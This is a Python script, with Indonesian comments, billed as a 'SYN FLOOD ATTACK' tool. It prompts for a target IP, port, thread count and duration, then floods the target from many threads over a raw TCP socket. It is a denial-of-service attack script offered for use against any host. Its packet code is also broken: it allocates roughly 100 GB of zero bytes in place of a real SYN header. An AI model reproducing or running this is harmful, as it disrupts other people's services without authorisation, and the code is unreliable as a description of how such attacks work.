import socket
import threading
import time
import os
import platform
from colorama import init, Fore, Style

# Inisialisasi Colorama
init(autoreset=True)

# Fungsi untuk membersihkan konsol
def clear_console():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system('clear')

# Fungsi untuk menampilkan teks berwarna
def print_colored_text(text):
    print(Fore.RED + text + Style.RESET_ALL)

# Fungsi untuk melakukan SYN Flood
def send_syn(target_ip, target_port, duration):
    # Membuat socket RAW untuk mengirim paket SYN
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)

    # Mengatur header TCP
    syn_packet = b'\x00' * 100000000000  # Packet dummy, ubah sesuai kebutuhan

    # Waktu akhir serangan
    end_time = time.time() + duration

    # Mengirimkan paket SYN dalam loop hingga waktu habis
    while time.time() < end_time:
        try:
            sock.sendto(syn_packet, (target_ip, target_port))
            print(f"Sent SYN packet to {target_ip}:{target_port}")
        except PermissionError:
            print("Permission Denied: Jalankan sebagai root")
            break

# Fungsi utama
if __name__ == "__main__":
    clear_console()
    print_colored_text("### SYN FLOOD ATTACK ###")
    print_colored_text("       [ GEN ]       ")
    
    target_ip = input("Masukkan IP target: ")  # Menginput IP target
    target_port = int(input("Masukkan port target: "))  # Menginput port target
    num_threads = int(input("Masukkan jumlah thread: "))  # Menginput jumlah thread
    duration = int(input("Masukkan durasi serangan (dalam detik): "))  # Menginput durasi serangan

    # Menjalankan serangan dalam beberapa thread
    for _ in range(num_threads):
        thread = threading.Thread(target=send_syn, args=(target_ip, target_port, duration))
        thread.start()
